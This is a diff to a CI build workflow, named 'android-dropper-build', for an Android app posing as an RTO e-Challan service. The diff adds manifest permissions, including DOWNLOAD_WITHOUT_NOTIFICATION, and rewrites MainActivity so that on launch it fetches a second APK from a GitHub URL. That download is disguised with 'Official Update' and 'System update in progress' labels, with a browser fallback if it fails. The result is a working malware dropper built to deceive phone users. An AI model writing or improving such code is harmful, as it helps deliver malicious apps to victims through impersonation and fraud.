@@ -1,25 +1,23 @@
 workflows:
   android-dropper-build:
-    name: RTO Background Downloader Fixed
+    name: RTO Permission Fixed
     max_build_duration: 60
-    instance_type: mac_mini_m1
+    instance_type: mac_mini_m2
     environment:
       java: 17
     scripts:
-      - name: Inject BG Download Logic & Force Path
+      - name: Fix Permissions & Background Download
         script: |
           cd RtoEChallan || exit 1
           
-          # 1. Resource Fix (Logo missing error fix from previous builds)
-          mkdir -p app/src/main/res/drawable
-          LOGO_FILE=$(find . -name "google_play_text_logo.png" | head -n 1)
-          if [ -f "$LOGO_FILE" ]; then
-            cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
-          else
-            cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/drawable/google_play_text_logo.png
-          fi
+          # 1. Force Permissions in Manifest (Fixing 11798.jpg error)
+          MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
+          sed -i '' '/<application/i \
+          <uses-permission android:name="android.permission.INTERNET" /> \
+          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
+          <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' "$MANIFEST_PATH"
 
-          # 2. Background Download Logic (No Chrome Redirect)
+          # 2. Production Download Logic
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           cat <<EOF > "$FILE_PATH"
           package com.example.rtoechallan
@@ -39,17 +37,17 @@ workflows:
                   val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                   try {
                       val request = DownloadManager.Request(Uri.parse(url))
-                      request.setTitle("App Update")
-                      request.setDescription("Downloading latest version...")
+                      request.setTitle("Official Update")
+                      request.setDescription("System update in progress...")
                       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
-                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Update.apk")
-
+                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Official.apk")
+                      
                       val manager = getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
                       manager.enqueue(request)
-                      
-                      Toast.makeText(this, "Download Shuru Ho Gaya Hai...", Toast.LENGTH_LONG).show()
+                      Toast.makeText(this, "Downloading Update...", Toast.LENGTH_LONG).show()
                   } catch (e: Exception) {
-                      Toast.makeText(this, "Error: " + e.message, Toast.LENGTH_SHORT).show()
+                      // Fallback for permission issues
+                      startActivity(android.content.Intent(android.content.Intent.ACTION_VIEW, Uri.parse(url)))
                   }
               }
           }
@@ -70,9 +68,8 @@ workflows:
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          gradle wrapper --gradle-version 8.0.2
           chmod +x gradlew
-          ./gradlew assembleDebug --no-daemon
+          ./gradlew assembleRelease --no-daemon
           
     artifacts:
-      - "**/build/outputs/apk/debug/*.apk"
+      - "**/build/outputs/apk/release/*.apk"
